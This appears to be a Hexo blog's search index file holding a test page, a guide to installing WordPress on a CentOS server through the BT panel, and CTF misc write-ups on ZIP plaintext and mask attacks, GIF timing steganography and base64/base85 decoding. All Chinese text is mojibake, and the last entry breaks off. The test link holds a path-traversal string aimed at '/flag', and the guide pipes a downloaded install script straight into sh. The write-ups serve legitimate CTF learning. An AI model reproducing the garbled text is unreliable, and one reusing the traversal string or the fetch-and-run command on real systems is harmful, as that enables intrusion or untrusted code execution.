<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="2020/12/27/test/"/>
      <url>2020/12/27/test/</url>
      
        <content type="html"><![CDATA[<!DOCTYPE html><html><head><meta charset="utf-8" /><title>test</title></head><body><h1><a href="httpsssss://../../../../../../../../../../../../../flag"></a></h1></body></html>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>åœ¨äº‘æœåŠ¡å™¨ä¸Šæ­å»ºåšå®¢ï¼ˆå®å¡”+WordPressï¼‰</title>
      <link href="2020/12/23/%E5%9C%A8%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E5%AE%9D%E5%A1%94+WordPress%EF%BC%89/"/>
      <url>2020/12/23/%E5%9C%A8%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E5%AE%9D%E5%A1%94+WordPress%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>å‡†å¤‡ï¼š</p><p>ä¸€å°èƒ½ä¸Šç½‘çš„ç”µè„‘</p><p>é˜¿é‡Œäº‘æœåŠ¡å™¨</p><p>FinalShell</p><a id="more"></a><br><p>ç”µè„‘ç³»ç»Ÿï¼šwin10</p><p>é˜¿é‡Œäº‘æœåŠ¡å™¨ç³»ç»Ÿé•œåƒï¼šCentOS 7.6</p><p>FinalShellç‰ˆæœ¬ï¼š3.6.3</p><br><h2 id="è¿æ¥äº‘æœåŠ¡å™¨"><a href="#è¿æ¥äº‘æœåŠ¡å™¨" class="headerlink" title="è¿æ¥äº‘æœåŠ¡å™¨"></a>è¿æ¥äº‘æœåŠ¡å™¨</h2><p>ç”¨FinalShellè¿æ¥äº‘æœåŠ¡å™¨ï¼ˆäº‘æœåŠ¡å™¨å·²å®ä¾‹ï¼‰</p><p><img src="https://s3.ax1x.com/2020/12/23/rcMcsH.png"></p><p>ç‚¹å‡»<code>SSHè¿æ¥(Linux)</code></p><p>åç§°éšæ„ï¼Œä¸»æœºå¡«äº‘æœåŠ¡å™¨çš„å…¬ç½‘IPï¼Œç”¨æˆ·åå¡«rootï¼Œå¯†ç å¡«äº‘æœåŠ¡å™¨å®ä¾‹å¯†ç ï¼Œç‚¹å‡»ç¡®å®š</p><p><img src="https://s3.ax1x.com/2020/12/23/rcMbLj.png"></p><p>ç„¶ååŒå‡»å³å¯è¿æ¥</p><br><h2 id="å®‰è£…å®å¡”Linuxé¢æ¿"><a href="#å®‰è£…å®å¡”Linuxé¢æ¿" class="headerlink" title="å®‰è£…å®å¡”Linuxé¢æ¿"></a>å®‰è£…å®å¡”Linuxé¢æ¿</h2><p><a href="https://www.bt.cn/bbs/thread-19376-1-1.html">å®å¡”Linuxé¢æ¿å®‰è£…æ•™ç¨‹ - 2020å¹´12æœˆ2æ—¥æ›´æ–° - 7.4.6æ­£å¼ç‰ˆ</a></p><p>ç”±äºç³»ç»Ÿæ˜¯CentOSçš„ï¼Œå¤åˆ¶CentOSå®‰è£…æŒ‡ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y wget &amp;&amp; wget -O install.sh http:&#x2F;&#x2F;download.bt.cn&#x2F;install&#x2F;install_6.0.sh &amp;&amp; sh install.sh</span><br></pre></td></tr></table></figure><p>æç¤ºæ˜¯å¦å®‰è£…å®å¡”é¢æ¿ï¼Œè¾“å…¥ <code>y</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Do you want to install Bt-Panel to the &#x2F;www directory now?(y&#x2F;n):y</span><br></pre></td></tr></table></figure><p>å®‰è£…å®Œæˆåè®°å½•ä¸‹å¤–ç½‘é¢æ¿åœ°å€ä»¥åŠusernameå’Œpassword</p><p><img src="https://s3.ax1x.com/2020/12/23/rcQLcD.png"></p><br><h2 id="å¼€é€šå¯¹åº”ç«¯å£"><a href="#å¼€é€šå¯¹åº”ç«¯å£" class="headerlink" title="å¼€é€šå¯¹åº”ç«¯å£"></a>å¼€é€šå¯¹åº”ç«¯å£</h2><p>ç‚¹å‡»å·¦ä¾§çš„<code>å®ä¾‹</code>ï¼Œç‚¹å‡»å¯¹åº”çš„æœåŠ¡å™¨</p><p>ç‚¹å‡»å·¦ä¾§çš„<code>æœ¬å®ä¾‹å®‰å…¨ç»„</code>ï¼Œç‚¹å‡»<code>é…ç½®è§„åˆ™</code></p><p>ç‚¹å‡»<code>å¿«é€Ÿåˆ›å»ºè§„åˆ™</code>ï¼Œå¼€é€š8888ä»¥åŠå¸¸ç”¨ç«¯å£</p><p><img src="https://s3.ax1x.com/2020/12/23/rclgUI.png"></p><br><h2 id="åˆ›å»ºç«™ç‚¹"><a href="#åˆ›å»ºç«™ç‚¹" class="headerlink" title="åˆ›å»ºç«™ç‚¹"></a>åˆ›å»ºç«™ç‚¹</h2><p>è®¿é—®å¤–ç½‘é¢æ¿åœ°å€ï¼Œè´¦å·è¾“å…¥usernameï¼Œå¯†ç è¾“å…¥password</p><p>ç‚¹å‡»å·¦è¾¹çš„<code>LNMP(æ¨è)</code>çš„<code>ä¸€é”®å®‰è£…</code></p><p>å®‰è£…å®Œæˆåæ·»åŠ ç«™ç‚¹</p><p><img src="https://s3.ax1x.com/2020/12/24/rc1TSK.png"></p><p>åŸŸåå¯ä»¥ç”¨IPä»£æ›¿ï¼Œæ ¹ç›®å½•è‡ªå·±å®šä¹‰ï¼Œæ·»åŠ MySQLæ•°æ®åº“</p><p>ç‚¹å‡»æäº¤å³å¯</p><br><h2 id="å®‰è£…WordPress"><a href="#å®‰è£…WordPress" class="headerlink" title="å®‰è£…WordPress"></a>å®‰è£…WordPress</h2><p>å®‰è£…WordPresså®˜ç½‘ï¼š<a href="https://cn.wordpress.org/download/">https://cn.wordpress.org/download/</a></p><p>ä¸‹è½½WordPressåä¸Šä¼ åˆ°å®å¡”Linuxé¢æ¿</p><p><img src="https://s3.ax1x.com/2020/12/24/rc39l8.png"></p><p>è§£å‹åˆ°blogç›®å½•ä¸‹</p><blockquote><p>ç›´æ¥è§£å‹çš„è¯æ˜¯è§£å‹åˆ°wordpressæ–‡ä»¶å¤¹é‡Œï¼Œå¤åˆ¶ç²˜è´´åˆ°blogç›®å½•ä¸‹å³å¯</p></blockquote><p>è®¿é—®åŸŸåè¿›è¡Œå®‰è£…ï¼Œç‚¹å‡»<code>ç°åœ¨å°±å¼€å§‹ï¼</code></p><p>æ•°æ®åº“åå’Œç”¨æˆ·åéƒ½æ˜¯ä¹‹å‰ç”Ÿæˆçš„æ•°æ®åº“åï¼Œå¯†ç ä¸ºæ•°æ®åº“å¯†ç </p><blockquote><p>å¯åœ¨å®å¡”Linuxé¢æ¿ç‚¹å‡»å·¦ä¾§çš„æ•°æ®åº“æŸ¥çœ‹</p></blockquote><p>è¾“å…¥å®Œæˆåç‚¹å‡»æäº¤</p><p>å¡«å†™ä¿¡æ¯é¡µé¢ï¼Œç«™ç‚¹æ ‡é¢˜éšæ„ï¼Œç”¨æˆ·åå’Œå¯†ç è‡ªå·±è®¾ç½®ï¼Œç”µå­é‚®ä»¶å†™è‡ªå·±çš„é‚®ç®±</p><p>ç‚¹å‡»<code>å®‰è£…WordPress</code>ï¼Œé‡æ–°è¾“å…¥è´¦å·å¯†ç ç™»å½•</p><p>æ­¤æ—¶è¿›å…¥çš„æ˜¯WordPressçš„åå°ï¼Œå¯ä»¥åœ¨åå°è¿›è¡Œåšå®¢ä¸»é¢˜ç­‰ç›¸å…³è®¾ç½®</p><p>è®¿é—®IPå³å¯çœ‹åˆ°åšå®¢äº†ï¼Œè‡³æ­¤åšå®¢æ­å»ºå®Œæˆ</p><p><img src="https://s3.ax1x.com/2020/12/24/rc3D7d.png"></p>]]></content>
      
      
      <categories>
          
          <category> å…¶å®ƒ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…¶å®ƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¤ç°3é“miscé¢˜</title>
      <link href="2020/12/22/%E5%A4%8D%E7%8E%B03%E9%81%93misc%E9%A2%98/"/>
      <url>2020/12/22/%E5%A4%8D%E7%8E%B03%E9%81%93misc%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p><strong>ç›®å½•</strong></p><ul><li>CISCN 2020 å¤èµ›(åå—èµ›åŒº) â€”â€” hidden_secret</li><li>å®‰æ´µæ¯ 2019 â€”â€” easy misc</li><li>SWPUCTF 2020 â€”â€” è€—å­å°¾æ±</li></ul><a id="more"></a><br><h2 id="hidden-secret"><a href="#hidden-secret" class="headerlink" title="hidden_secret"></a>hidden_secret</h2><p>é¢˜ç›®ï¼šCISCN 2020 å¤èµ›ï¼ˆåå—èµ›åŒºï¼‰</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/Lziyang/p/13741751.html">CISCN å¤èµ›(åå—èµ›åŒº)éƒ¨åˆ†wp - è¿·å¤±çš„è€é¼  - åšå®¢å›­ (cnblogs.com)</a></p><p>æ–‡ä»¶ï¼š<code>flag1.zip</code></p><br><p><code>flag1.zip</code>è§£å‹å‡ºæ¥æ˜¯ä¸€å¼ å›¾ç‰‡ï¼ˆ<code>hahah.jpg</code>ï¼‰å’Œä¸€ä¸ªå‹ç¼©åŒ…ï¼ˆ<code>hidden_secret.zip</code>ï¼‰</p><p>å›¾ç‰‡å¥½åƒæ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œå‹ç¼©åŒ…è§£å¯†éœ€è¦å¯†ç </p><p>æ‰“å¼€<code>hidden_secret.zip</code>ï¼Œå‘ç°åŠ å¯†çš„æ–‡ä»¶é‡Œé¢ä¹Ÿæœ‰<code>hahah.jpg</code>ï¼Œè€Œä¸”crcæ ¡éªŒå€¼ä¸€æ ·</p><p><img src="https://s3.ax1x.com/2020/11/15/DP4ciq.png" alt="DP4ciq.png"></p><p>ç”¨ARCHPRè¿›è¡Œæ˜æ–‡æ”»å‡»</p><p><img src="https://s3.ax1x.com/2020/11/15/DP5Al8.png" alt="DP5Al8.png"></p><p><img src="https://s3.ax1x.com/2020/11/15/DP4OSK.png" alt="DP4OSK.png"></p><p>æ‹¿åˆ°äº†<code>hidden_secret.zip</code>çš„è§£å‹å¯†ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pb-1&#96;;ks</span><br></pre></td></tr></table></figure><p>è§£å‹ååˆæ˜¯é‚£ä¸ªç‹—å¤´ï¼Œè¿˜æœ‰ä¸ª<code>hidden_secret.rar</code>ï¼Œç»§ç»­è§£å‹</p><p>å¾—åˆ°<code>key.gif</code></p><p>ä¸­é€”çœ‹åˆ°æœ‰ä¸€å¸§æœ‰äºŒç»´ç </p><p>ç”¨PSæ‰“å¼€ï¼Œåœ¨å›¾å±‚34æŸ¥çœ‹å›¾å±‚</p><p><a href="https://imgchr.com/i/DP5v90"><img src="https://s3.ax1x.com/2020/11/15/DP5v90.png" alt="DP5v90.png"></a></p><p>æ‰«ç å¾—åˆ°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ni_chou_sha&#125;</span><br></pre></td></tr></table></figure><p>æäº¤åå‘ç°ä¸å¯¹ğŸ˜¡</p><br><p>ç”¨stegsolveåˆ†æå›¾åƒä¿¡æ¯ï¼Œå¯ä»¥å‘ç°è¿™ä¸ªgifåŠ¨å›¾çš„é—´éš”æ—¶é—´åˆ†ä¸º10å’Œ20ä¸¤ç§ï¼Œè€ƒè™‘gifæ—¶é—´éšå†™</p><p>å°†æ‰€æœ‰é—´éš”æ—¶é—´åˆ†ç¦»å‡ºæ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">identify -format &quot;%T&quot; key.gif</span><br></pre></td></tr></table></figure><p><img src="https://s3.ax1x.com/2020/11/15/DPTg74.png" alt="DPTg74.png"></p><p>å¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1020201020201020102010101020101010102020102010201020102020202020102020101020201010202020101020201020202010201010</span><br></pre></td></tr></table></figure><p>å°†<code>10</code>è½¬åŒ–ä¸º<code>0</code>ï¼Œ<code>20</code>è½¬åŒ–ä¸º<code>1</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&quot;1020201020201020102010101020101010102020102010201020102020202020102020101020201010202020101020201020202010201010&quot;</span>;</span><br><span class="line"></span><br><span class="line">$a = str_replace(<span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, $a);</span><br><span class="line">$a = str_replace(<span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, $a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01101101010001000011010101011111011001100111001101110100</span><br></pre></td></tr></table></figure><p>å°†<a href="http://www.ah888.org/wenben_binarystr.html">äºŒè¿›åˆ¶è½¬ä¸ºå­—ç¬¦ä¸²</a>ï¼Œå¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mD5_fst</span><br></pre></td></tr></table></figure><p>md5åŠ å¯†åå¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">046cb65e60a4774c76b4f99371e66f0d</span><br></pre></td></tr></table></figure><p>æ ¹æ®é¢˜ç›®æç¤ºntfsï¼ŒæŸ¥çœ‹æ–‡ä»¶å¤¹éšè—æ–‡ä»¶ï¼Œåœ¨hidden_secretæ–‡ä»¶å¤¹ä¸­å‘ç°éšè—æ–‡ä»¶</p><p><img src="https://s3.ax1x.com/2020/11/15/DPHwQ0.png" alt="DPHwQ0.png"></p><p>å¯¼å‡ºåé‡å‘½åä¸º<code>1.rar</code></p><p>è§£å‹å¯†ç ä¸ºä¸Šé¢çš„MD5</p><p>è§£å‹å¾—åˆ°<code>flag.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f935c5d0470757a3d2f3ee7467366f4e&#125;</span><br></pre></td></tr></table></figure><br><h2 id="easy-misc"><a href="#easy-misc" class="headerlink" title="easy misc"></a>easy misc</h2><p>é¢˜ç›®ï¼šå®‰æ´µæ¯ 2019</p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/m0_46481239/article/details/107915123">BUUCTF:[å®‰æ´µæ¯ 2019]easy misc_F10NA-CSDNåšå®¢</a></p><p>æ–‡ä»¶ï¼š<code>attachment.rar</code></p><br><p>è§£å‹ä¹‹åæœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼ˆå¤¹ï¼‰</p><p><img src="https://s3.ax1x.com/2020/11/28/D6MuvT.png"></p><p><code>decode.zip</code>ä¸ºåŠ å¯†æ–‡ä»¶ï¼Œä½†æœ‰æ³¨é‡Š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG IN ((âˆš2524921X85Ã·5+2)Ã·15-1794)+NNULLULL,</span><br></pre></td></tr></table></figure><p>ç®—å‡ºæ¥æ˜¯7</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (sqrt(<span class="number">2524921</span>)*<span class="number">85</span>/<span class="number">5</span>+<span class="number">2</span>)/<span class="number">15</span><span class="number">-1794</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ©ç æ”»å‡»</p><p><img src="https://s3.ax1x.com/2020/11/28/D6Qmod.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2019456NNULLULL,</span><br></pre></td></tr></table></figure><p>è§£å‹åå¾—åˆ°<code>decode.txt</code>ï¼Œç¡®è®¤ä¸º<strong>å­—é¢‘éšå†™</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">a &#x3D; dIW</span><br><span class="line">b &#x3D; sSD</span><br><span class="line">c &#x3D; adE </span><br><span class="line">d &#x3D; jVf</span><br><span class="line">e &#x3D; QW8</span><br><span class="line">f &#x3D; SA&#x3D;</span><br><span class="line">g &#x3D; jBt</span><br><span class="line">h &#x3D; 5RE</span><br><span class="line">i &#x3D; tRQ</span><br><span class="line">j &#x3D; SPA</span><br><span class="line">k &#x3D; 8DS</span><br><span class="line">l &#x3D; XiE</span><br><span class="line">m &#x3D; S8S</span><br><span class="line">n &#x3D; MkF</span><br><span class="line">o &#x3D; T9p</span><br><span class="line">p &#x3D; PS5</span><br><span class="line">q &#x3D; E&#x2F;S</span><br><span class="line">r &#x3D; -sd</span><br><span class="line">s &#x3D; SQW</span><br><span class="line">t &#x3D; obW</span><br><span class="line">u &#x3D; &#x2F;WS</span><br><span class="line">v &#x3D; SD9</span><br><span class="line">w &#x3D; cw&#x3D;</span><br><span class="line">x &#x3D; ASD</span><br><span class="line">y &#x3D; FTa</span><br><span class="line">z &#x3D; AE7</span><br></pre></td></tr></table></figure><br><p>è€Œåœ¨<code>read</code>æ–‡ä»¶å¤¹é‡Œæœ‰å¤§é‡txtæ–‡ä»¶ï¼Œé‡Œé¢æœ‰ä¸ª<code>hint.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:å–å‰16ä¸ªå­—ç¬¦</span><br></pre></td></tr></table></figure><p>ä½†ä¸çŸ¥é“æ˜¯å–å“ªä¸ªtxtæ–‡ä»¶çš„å‰16é«˜é¢‘å­—æ¯</p><p>ä½¿ç”¨foremoståˆ†ç¦»<code>å°å§å§.png</code>ï¼Œå¾—åˆ°</p><p><img src="https://s3.ax1x.com/2020/12/22/rsahbF.png"></p><p>ä½¿ç”¨ç›²æ°´å°å·¥å…·åˆ†ç¦»ï¼š<a href="https://www.lizenghai.com/archives/72687.html">ç›²æ°´å°åˆæˆä¸è§£å¯†</a></p><blockquote><p>å®‰è£…ä¸äº†opencvåº“ï¼Œç›®å‰æ²¡æœ‰æå–æˆåŠŸï¼Œæ®è¯´æ˜¯11.txt</p></blockquote><p>å¯¹11.txtè¿›è¡Œå­—é¢‘åˆ†æï¼š<a href="http://www.aihanyu.org/cncorpus/CpsTongji.aspx">http://www.aihanyu.org/cncorpus/CpsTongji.aspx</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">åºå· å­—è¯å‡ºç°æ¬¡æ•°   å‡ºç°é¢‘ç‡</span><br><span class="line">1 1720317.4123</span><br><span class="line">2e89389.0467</span><br><span class="line">3t62786.3544</span><br><span class="line">4a58495.9202</span><br><span class="line">5o53725.4374</span><br><span class="line">6n49324.992</span><br><span class="line">7r45254.5801</span><br><span class="line">8h44604.5143</span><br><span class="line">9s43474.3999</span><br><span class="line">10i42914.3432</span><br><span class="line">11d36403.6843</span><br><span class="line">12l33393.3796</span><br><span class="line">13u23082.3361</span><br><span class="line">14y19031.9262</span><br><span class="line">15g18511.8735</span><br><span class="line">16w17331.7541</span><br><span class="line">17c15061.5243</span><br><span class="line">18m14911.5091</span><br><span class="line">19.14231.4403</span><br><span class="line">20f12461.2612</span><br><span class="line">21ã€€12031.2176</span><br><span class="line">22b11991.2136</span><br><span class="line">23,11811.1954</span><br><span class="line">24p11091.1225</span><br><span class="line">25k931    0.9423</span><br><span class="line">26&quot;  866  0.8765</span><br><span class="line">27&#39;7100.7186</span><br><span class="line">28H6030.6103</span><br><span class="line">29v5920.5992</span><br><span class="line">30-4500.4555</span><br><span class="line">31D3520.3563</span><br><span class="line">32I2810.2844</span><br><span class="line">33T2500.253</span><br><span class="line">34A1970.1994</span><br><span class="line">35P1940.1964</span><br><span class="line">36M1820.1842</span><br><span class="line">37?1520.1538</span><br><span class="line">38S1310.1326</span><br><span class="line">39W1240.1255</span><br><span class="line">40V1190.1204</span><br><span class="line">41U1170.1184</span><br><span class="line">42O1060.1073</span><br><span class="line">43!960.0972</span><br><span class="line">44G800.081</span><br><span class="line">45E760.0769</span><br><span class="line">46x760.0769</span><br><span class="line">47B740.0749</span><br><span class="line">48j740.0749</span><br><span class="line">49Y730.0739</span><br><span class="line">50z730.0739</span><br><span class="line">51N720.0729</span><br><span class="line">52C610.0617</span><br><span class="line">53R560.0567</span><br><span class="line">54L550.0557</span><br><span class="line">55F530.0536</span><br><span class="line">56q490.0496</span><br><span class="line">57;320.0324</span><br><span class="line">58K300.0304</span><br><span class="line">59:220.0223</span><br><span class="line">60(140.0142</span><br><span class="line">61)140.0142</span><br><span class="line">62J130.0132</span><br><span class="line">63150.0051</span><br><span class="line">64330.003</span><br><span class="line">65430.003</span><br><span class="line">66Q30.003</span><br><span class="line">67220.002</span><br><span class="line">68Z20.002</span><br><span class="line">69~10.001</span><br><span class="line">70010.001</span><br><span class="line">71710.001</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ä½¿ç”¨è„šæœ¬è¿›è¡Œå­—é¢‘åˆ†æ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">&#x27;E:/11.txt&#x27;</span>)</span><br><span class="line">line = file.readlines()</span><br><span class="line">file.seek(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line">result = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> line:</span><br><span class="line">find_line = re.findall(chr(i),j)</span><br><span class="line">count += len(find_line)</span><br><span class="line">result[chr(i)] = count</span><br><span class="line">res = sorted(result.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">num = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> res:</span><br><span class="line">print(<span class="string">&#x27;é¢‘æ•°ç¬¬&#123;0&#125;: &#x27;</span>.format(num),x)</span><br><span class="line">num += <span class="number">1</span> </span><br></pre></td></tr></table></figure><br><p>å‰16é«˜é¢‘å­—ç¬¦ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">etaonrhsidluygw</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QW8obWdIWT9pMkF-sd5RESQWtRQjVfXiE&#x2F;WSFTajBtcw&#x3D;</span><br></pre></td></tr></table></figure><p>ç¼–ç åç¼€ç¬¦å·ä¸º<code>=</code>ï¼ŒçŒœæµ‹æ˜¯base64</p><p>ä½†æ ‡å‡†base64åªæœ‰64ä¸ªå­—ç¬¦ï¼ˆè‹±æ–‡å¤§å°å†™ã€æ•°å­—å’Œ+ã€/ï¼‰ä»¥åŠç”¨ä½œåç¼€ç­‰å·ï¼Œå¹¶æ²¡æœ‰<code>r=-sd</code>çš„<code>-</code>ï¼ŒæŸ¥äº†ä¸‹å‘ç°é¢˜ç›®å‡ºé”™äº†</p><p><img src="https://s3.ax1x.com/2020/12/23/ryWqeJ.png"></p><p>æ‰€ä»¥æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QW8obWdIWT9pMkFSQWtRQjVfXiE&#x2F;WSFTajBtcw&#x3D;</span><br></pre></td></tr></table></figure><p>base64è§£ç åå¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ao(mgHY?i2ARAkQB5_^!?Y!Sj0ms</span><br></pre></td></tr></table></figure><p>base85è§£ç åå¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;have_a_good_day1&#125;</span><br></pre></td></tr></table></figure><br><h2 id="è€—å­å°¾æ±"><a href="#è€—å­å°¾æ±" class="headerlink" title="è€—å­å°¾æ±"></a>è€—å­å°¾æ±</h2><p>é¢˜ç›®ï¼šSWPUCTF 2020</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/LEOGG321/archive/2004/01/13/14094598.html">SWPUCTF2020 Miscé¢˜è§£</a></p><p>æ–‡ä»¶ï¼š<code>hzwz.gif</code></p><p><img src="https://s3.ax1x.com/2020/12/23/ryfyfx.png"></p><p>binwalkæå–ä¸€ä¸‹ï¼Œå¾—åˆ°4ä¸ªæ–‡ä»¶</p><p><img src="https://s3.ax1x.com/2020/12/23/ryhn41.png"></p><p><code>flag.txt</code>æ²¡æœ‰flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Th1s_1s_fa1se_f1ag&#125;</span><br><span class="line">ä¸Šæ¥å°±åˆ†ç¦»æˆ‘åˆæˆçš„gif  è¿™å¥½å—ï¼Ÿè¿™ä¸å¥½ï¼</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å•ªçš„ä¸€ä¸‹  